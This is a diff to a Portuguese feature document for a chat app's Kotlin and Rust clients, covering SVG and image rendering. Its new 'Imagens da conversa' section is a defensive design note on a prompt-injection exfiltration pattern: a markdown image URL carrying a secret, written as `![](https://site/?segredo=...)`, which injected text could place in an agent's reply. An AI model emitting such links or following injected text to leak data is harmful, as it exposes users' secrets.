@@ -45,8 +45,9 @@ vai para a tabela abaixo, com o motivo. Textos ficam em `android/shared/src/comm
 | Diagrama Mermaid em tela cheia, com zoom e arrasto | sim | sim | Kotlin: pinça; desktop: botões +/− e teclado +/−, até 8×; arrasto move, duplo clique/toque restaura, Esc ou Fechar sai |
 | Detalhes da sessão e do subagente: seções Estado, Modelo, Contexto e Identificadores; campos vazios ocultos | sim | sim | subagente mostra papel, tarefa, modelo e contexto próprios e leva à sessão principal; identificadores copiáveis |
 | Copiar bloco de código, código do Mermaid e mensagem inteira | sim | sim | |
-| Imagens do markdown viram link; links externos só `http`/`https` | sim | sim | nenhum cliente baixa imagem inline |
 | Tentar de novo após erro de envio | sim | sim | Envio ambíguo continua pedindo confirmação. Pendente de conferência no Rust: conflito de envio ou comando após trocar de conversa. A consulta de status Rust já confere o id da operação. |
+| Blocos `svg` desenhados na conversa, com a mesma tela cheia | sim | sim | desenho local nos dois; `var(--fg)`, `--accent` etc. viram cores fixas sobre fundo branco; Kotlin aceita até 200.000 caracteres |
+| Imagens do markdown abaixo do texto; o link continua no texto; links externos só `http`/`https` | sim | sim | `data:` e caminho absoluto do host (`/api/files/raw`) carregam sozinhos; `http`/`https` só após "Carregar imagem", sem cookies do Habblaud; até 10 MB. Link comum com destino `.png`, `.jpg`, `.jpeg`, `.gif`, `.webp` ou `.svg` também é desenhado; URL solta sem `<>` só no Kotlin |
 
 ### Diagramas no cliente Kotlin
 
@@ -62,6 +63,14 @@ recusa sai do cache. JVM/iOS usam `decodeToSvgPainter` de Compose Resources; And
 Compose Resources 1.12.2 não fornece esse leitor no Android. O AndroidSVG não aceita SVG 2
 (`orient="auto-start-reverse"`), por isso o servidor troca esses marcadores pelo equivalente com `orient="auto"`.
 Tocar no diagrama abre tela cheia: pinça amplia até 8×, arrastar move, toque duplo volta ao inicial.
+
+### Imagens da conversa
+
+Baixar imagem remota sozinho deixaria texto injetado na resposta do agente vazar dados pela URL
+(`![](https://site/?segredo=...)`); por isso a remota espera o toque e usa um cliente HTTP sem credenciais.
+Arquivo do host usa a rota e a trava do navegador de arquivos: fora do acesso permitido, fica só o link.
+Falha de carga ou de leitura também deixa só o link. Kotlin junta as imagens no fim da mensagem;
+Rust põe cada uma logo abaixo do parágrafo que a cita.
 
 ## Verificação
 
